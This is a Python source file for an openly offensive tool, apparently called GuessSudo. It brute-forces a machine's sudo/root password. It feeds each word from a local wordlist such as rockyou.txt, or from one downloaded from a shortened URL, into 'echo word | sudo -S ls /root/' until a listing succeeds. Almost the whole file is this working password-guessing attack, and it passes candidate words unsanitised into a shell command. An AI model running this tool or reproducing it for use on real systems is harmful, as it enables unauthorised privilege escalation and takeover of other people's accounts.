import sys , os , requests , argparse , time , platform 
from multiprocessing import cpu_count

# Colors
red= "\u001b[31m"
green= "\u001b[32m"
blue= "\u001b[34m"
nc= "\033[0m" 

# Num Cores in This Device
Num_Cores = cpu_count()

# Num Arguments
Num_arg = len(sys.argv)
arg = sys.argv
fileName = "NewWordList.txt"

def handle_error(type, value, traceback):
    error = f"\n{red}good Bay :)"
    displaySlow(error)
    if os.path.isfile("error"):
        os.remove("error")
    

sys.excepthook = handle_error

# Disply Slow Words
def displaySlow(words , date=0.02):
    for char in words:
        print(char, end='', flush=True)
        time.sleep(date)
        
# Display Examples
def examples():
    exam = f'''{nc}
usage: GuessHowAmI.py [-h] [--wordlist WORDLIST] [--external EXTERNAL]

options:
  -h, --help            show this help message and exit

{red}Examples:{nc}
=========
{green}python3 {nc}GuessSudo.py --wordlist rockyou.txt
    
{green}python3 {nc}GuessSudo.py --external https://bit.ly/406aZL6
    
{green}python3 {nc}GuessSudo.py -w rouckyou.txt --external https://bit.ly/406aZL6 {red}(recommended){nc}

    '''

    displaySlow(exam , 0.02)


# Display banner
def banner():

    banner =  f'''{green}               . .IIIII
  I%sIIII. I  II  .    II..IIIIIIIIIIIIIIIIIIII
 .  .IIIIII  II             IIIIII%sIIIII  I.
    .IIIII.III I        IIIIIIIIIIIIIIIIIIIIIII
   .II%sII           II  .IIIII IIIIIIIIIIII. I
    IIIIII             IIII I  II%sIIIIIII I
    .II               IIII{red}Author:{green}IIII  
       I.           .III%sIIIIIII
         .IIII        II{blue}Mohammed{green}I
          IIIII.        II{blue}Khalid{green}
          II%sIII        IIIIII   
           IIIIII          IIII...
            IIII            III
            III              II       
            II               I            
            I                                       
    {nc}'''
    print(banner)
    # displaySlow(banner , 0.01)


# Help Menu
def parseArgs():
    banner()
    parser = argparse.ArgumentParser(description="")
    parser.add_argument('--wordlist', '-w', help='# Enter WordList')
    parser.add_argument('--external', '-e', help='# Enter WordList from outside the machine (URL)')
    parser.parse_args()
    args = parser.parse_args()
    return args


# Download WordList From internet (URL)
def Download(url1):
    url2 = f"{url1}"
    response = requests.get(url2)
    content = response.content.decode('utf-8')

    with open(fileName , 'w') as file :
        file.write(content)


# Display Alert Massage And Check Your Accept Or Not 
def massageCheck():
    massage = f'''\n{red}Important alert:
  {blue}The account may be closed if you meet certain conditions 
  set by the Root of this system .. Continue [{green}y{nc}/{red}n{blue}] ? : {nc}'''
    displaySlow(massage)
    check= input("")
    return check


# The Disapproval Massage
def massageExit():
    displaySlow(f"{red}\nExiting the tool ..")


# Display Details OS
def DisplayDetails():

    os = platform.uname()

    text = f'''
    {green}OS: {blue}{os.system}
    {green}HostaName: {blue}{os.node}
    {green}OS Version: {blue}{os.release}
    {green}OS Release: {blue}{os.version}
    {green}OS Architecture: {blue}{os.machine}
    {green}Numbers Cores: {blue}{Num_Cores}{nc}
    '''

    displaySlow(text)


# Return Number Lines Files
def NumLines(name_file):

    file = open(f"{name_file}" ,'r') 
    lines = file.readlines()

    return len(lines)


# The Function guessing
def Guess(word):

        slines = NumLines(word)
        glines = 1

        with open (word) as file:
            WordList = [line.split(",") for line in file.read().splitlines()]
            
            for i in WordList:
                word = ''.join(i)
                os.system("sudo -k")
                status = os.popen(f"echo {word} | sudo -S ls /root/ 2> error").read()
                if (len(status) == 0):
                    failed = f"{red}Failed Password {green}{glines} {nc}| {blue}{slines}: {red}{word}\n"
                    displaySlow(failed)
                    glines += 1
                    
                else :
                    found = f"{green}Found Password Root : {word}\n" 
                    displaySlow(found)
                    exit()
            massage = f"\n{red}Sorry ,{blue} This WordList Does Not Contain root Password :(\n"
            displaySlow(massage)
        
        


# Dealing Arguments And Start Script
def main():
    args = parseArgs()
    word = args.wordlist
    ext = args.external
    if Num_arg == 1:
        DisplayDetails()
        examples()
        exit()
    else:
        check = massageCheck()
        if check.lower() == "y" or check.lower() == "yes":

            if word != None and ext == None:
                details = f"\n{green}{word}: {blue}{NumLines(word)} Password{nc}\n"
                displaySlow(details)
                Guess(word)
            
            elif ext != None and word == None:
                Download(ext)
                details = f"\n{green}{ext}: {blue}{NumLines(fileName)} Password{nc}\n"
                displaySlow(details)
                Guess(fileName)
                os.remove(fileName)
            
            elif ext != None and word != None:
                Download(ext)
                details = f'''\n{green}Your Enter Two(2) WordList{nc}
                {green}{word}: {blue}{NumLines(word)} Password{nc}
                {green}{ext}: {blue}{NumLines(fileName)} Password{nc}
                '''
                displaySlow(details)
                Guess(word)
                Guess(fileName)
                os.remove(fileName)
            
            elif word != None and ext == None:
                details = f"\n{green}{word}: {blue}{NumLines(word)} Password{nc}\n"
                displaySlow(details)
                Guess(word)
        
        elif check.lower() == "n" or check.lower() == "no":
            massageExit()
            displaySlow(f"\n{green}good Bay\n")

        
        else:
            displaySlow(f"{red}\nInvalid entry!!{nc}\n")
            exit()


main()



